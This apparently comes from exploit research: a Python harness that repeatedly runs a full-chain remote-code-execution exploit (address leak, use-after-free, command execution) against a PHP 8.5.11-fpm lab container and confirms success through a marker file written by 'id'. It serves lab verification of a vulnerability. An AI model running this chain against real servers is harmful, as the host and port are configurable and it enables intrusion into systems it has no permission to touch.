#!/usr/bin/env python3
"""Verifier for fpm_fullchain_rce.py, end to end on an 8.5.11-fpm lab. Runs the
composed chain (remote binbase leak -> UAF -> RCE) N times with no /proc seed in
the exploit path and checks the out-of-band marker that system('id') wrote (the
fire SIGSEGVs after system() returns, so the HTTP response is useless). The
remote binbase is cross-checked against /proc only after the fact. Needs docker
access to the lab container. Lab/analysis use only.

Lab: the committed vd24481-8511 profile -- an 8.5.11-fpm echo-sink pool (container
p2s-vd24481-8511-fpm) behind nginx on :8186, serving lab/vd24481/html/remote_app.php
(the same a7 echo sink as the a7r5 lab, built from php:8.5.11-fpm):

  docker compose -f docker-compose.versions.yml --profile vd24481-8511 up -d --build
  python3 -I poc/chains/verify_fpm_fullchain_rce.py \
      --container p2s-vd24481-8511-fpm --host 127.0.0.1 --port 8186 --runs 5
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load_fullchain():
    path = os.path.join(_HERE, "fpm_fullchain_rce.py")
    spec = importlib.util.spec_from_file_location("fpm_fullchain_rce", path)
    m = importlib.util.module_from_spec(spec)
    if _HERE not in sys.path:
        sys.path.insert(0, _HERE)
    spec.loader.exec_module(m)
    return m


if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.labharness import _dx, proc_binbase  # noqa: E402


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="p2s-vd24481-8511-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8186)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--marker", default="/dev/shm/p")
    ap.add_argument("--runs", type=int, default=5)
    args = ap.parse_args(argv)

    fc = _load_fullchain()

    print(f"[verify] 8.5.11-fpm constants: "
          f"OBJ_CHUNK_OFF=0x{fc.OBJ_CHUNK_OFF:x} "
          f"ZVAL_PTR_DTOR_OFF=0x{fc.ZVAL_PTR_DTOR_OFF:x} "
          f"STD_OBJ_HANDLERS_OFF=0x{fc.STD_OBJ_HANDLERS_OFF:x}")
    pbb = proc_binbase(args.container)
    print(f"[verify] /proc binbase (cross-check only, NOT fed in): "
          f"{hex(pbb) if pbb else 'n/a'}")

    wins = 0
    uid_ok = 0
    leak_match = 0
    req_total = 0
    marker_cmd = f"id>{args.marker}"
    for run in range(1, args.runs + 1):
        print("\n" + "#" * 64 + f"\n[verify] RUN {run}/{args.runs}\n" + "#" * 64)
        # clear marker so a stale file can't produce a false positive
        _dx(args.container, "sh", "-c", f"rm -f {args.marker}")
        t0 = time.time()
        r = fc.full_chain(args.host, args.port, args.path, marker_cmd,
                          verbose=True)
        dt = time.time() - t0
        bb = r.get("binbase")
        if bb is not None and pbb is not None and bb == pbb:
            leak_match += 1
        reqs = (r.get("leak_reqs") or 0) + (r.get("rce_reqs") or 0)
        req_total += reqs
        # out-of-band marker read
        time.sleep(0.4)
        rc, out = _dx(args.container, "sh", "-c",
                      f"cat {args.marker} 2>/dev/null")
        out = out.strip()
        fired = r.get("ok")
        got_uid = ("uid=" in out)
        is_wwwdata = ("www-data" in out) or ("uid=33" in out)
        if fired:
            wins += 1
        if got_uid:
            uid_ok += 1
        bbs = f"0x{bb:x}" if bb else "None"
        print(f"[verify] RUN {run}: fire={fired} binbase={bbs} "
              f"binbase==/proc={bb==pbb} reqs={reqs} elapsed={dt:.1f}s")
        print(f"[verify] RUN {run}: marker={out!r} "
              f"-> uid_present={got_uid} www-data={is_wwwdata}")

    print("\n" + "=" * 64)
    print(f"[verify] SUMMARY over {args.runs} runs:")
    print(f"  fire delivered     : {wins}/{args.runs}")
    print(f"  marker uid=www-data: {uid_ok}/{args.runs}  "
          f"(the real end-to-end success signal)")
    print(f"  binbase==/proc     : {leak_match}/{args.runs}  "
          f"(remote leak correctness)")
    print(f"  avg requests/run   : {req_total / args.runs:.1f}")
    print(f"  NO /proc seed was fed into any exploit step.")
    return 0 if uid_ok == args.runs else 1


if __name__ == "__main__":
    sys.exit(main())
